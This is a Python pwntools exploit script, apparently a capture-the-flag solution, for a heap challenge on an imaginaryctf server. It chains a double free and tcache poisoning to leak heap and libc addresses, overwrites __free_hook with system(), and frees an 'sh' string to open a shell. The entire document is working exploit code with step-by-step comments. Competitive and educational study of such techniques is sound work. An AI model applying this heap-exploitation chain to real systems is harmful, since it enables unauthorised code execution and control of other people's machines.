from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc-2.27.so")

#conn = elf.process()
conn = remote("puzzler7.imaginaryctf.org", 31337)

# wrappers for the 4 functions because we are lazy
def a(index):
  conn.recvuntil("bagel ✏️\n")
  conn.sendline("c")
  conn.recvline()
  conn.sendline(str(index))

def f(index):
  conn.recvuntil("bagel ✏️\n")
  conn.sendline("e")
  conn.recvline()
  conn.sendline(str(index))

def p(index):
  conn.recvuntil("bagel ✏️\n")
  conn.sendline("v")
  conn.recvline()
  conn.sendline(str(index))
  return conn.recvlines(2)[0]

def e(index, content):
  conn.recvuntil("bagel ✏️\n")
  conn.sendline("d")
  conn.recvline()
  conn.sendline(str(index))
  conn.recvline()
  conn.sendline(content)

a(0) # chunk for heap leak
a(1) # chunk for libc leak
a(2) # chunk to poison

f(0)
f(0)

heap = (u64(p(0) + b"\x00\x00")>>12)<<12 # fd leaks address of chunk 0, leaking heap base
info("heap: " + hex(heap))

e(0,p64(heap+16)) # overwrite fd with &tcache_perthread_struct

a(3) # chunk 0 gets returned
a(4) # get chunk over tcache_perthread_struct

e(4, b"\x07"*16) # artificially fill tcachebins

f(1) # gets sent to unsorted

leak = u64(p(1) + b'\x00'*2)
info("leak: " + hex(leak))

# calculate libc
libc.address = leak - 0x3ebca0

info("libc base: " + hex(libc.address))
info("__free_hook: " + hex(libc.symbols["__free_hook"]))
info("system(): " + hex(libc.symbols["system"]))

e(4, b"sh" + b"\x00"*6) # fix the tcaches, use tcache_perthread_struct as a scratchpad

f(2) # time to poison tcache again!
e(2, p64(libc.symbols["__free_hook"])) # overwrite fd of a tcachebin chunk with __free_hook
a(5) # get chunk 2
a(6) # get chunk over __free_hook
e(6, p64(libc.symbols["system"])) # write system() to __free_hook
f(4) # free("sh") which triggers system("sh")

#gdb.attach(conn)
conn.interactive() # get our shell
